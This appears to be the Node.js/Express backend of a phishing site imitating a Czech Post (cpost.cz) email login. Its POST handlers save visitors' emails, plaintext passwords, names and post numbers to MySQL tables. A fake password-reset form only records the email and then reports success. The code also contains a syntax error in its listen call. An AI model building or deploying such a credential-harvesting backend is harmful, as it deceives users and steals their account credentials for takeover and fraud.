// import all libraries
const express = require("express")
const path = require("path")
const bodyParser = require("body-parser")
const { emitKeypressEvents } = require("readline")
require("dotenv").config()

// configure knex
const knex = require("knex")({
    client: "mysql",
    connection: {
        host: process.env.MYSQL_HOST,
        port: process.env.MYSQL_PORT,
        user: process.env.MYSQL_USER,
        password: process.env.MYSQL_PASSWORD,
        database: process.env.MYSQL_DATABASE
    }
})

// init our app
const app = express()
const port = process.env.PORT || 80 || 3000;

// use static files renderer and bodyparser middleware
app.use(express.static("public"))
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))

//! GET paths
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "/public/index.html"))
})

app.get("/vlastni-email", (req, res) => {
    res.sendFile(path.join(__dirname, "/public/vlastni-email.html"))
})

app.get("/zapomenute-heslo", (req, res) => {
    res.sendFile(path.join(__dirname, "public/zapomenute-heslo.html"))
})

//! POST paths
// default login form on index
app.post("/postDefaultLogin", (req, res) => {
    knex("defaultLogins").insert({
        email: req.body.email, password: req.body.password
    }).then((result) => {
        console.log("Default login OK")
        res.sendFile(path.join(__dirname, "public/dekujeme.html"))
    })
})

// reset password form
app.post("/postResetPassword", (req, res) => {
    knex("resetPassword").insert({
        email: req.body.email
    }).then((result) => {
        console.log("Reset password OK")
        res.sendFile(path.join(__dirname, "public/heslo-zmeneno.html"))
    })
})

// no cpost.cz email form
app.post("/postOwnEmail", (req, res) => {
    knex("customMail").insert({
        firstName: req.body.firstName,
        secondName: req.body.surname,
        email: req.body.email,
        postNumber: req.body.postNo,
        password: req.body.password
    }).then((result) => {
        console.log("Custom mail OK")
        res.sendFile(path.join(__dirname, "public/dekujeme.html"))
    })
})

// run the app
app.listen(port, "127.0.0.1" () => {
    console.log(`app on ${port}`)
})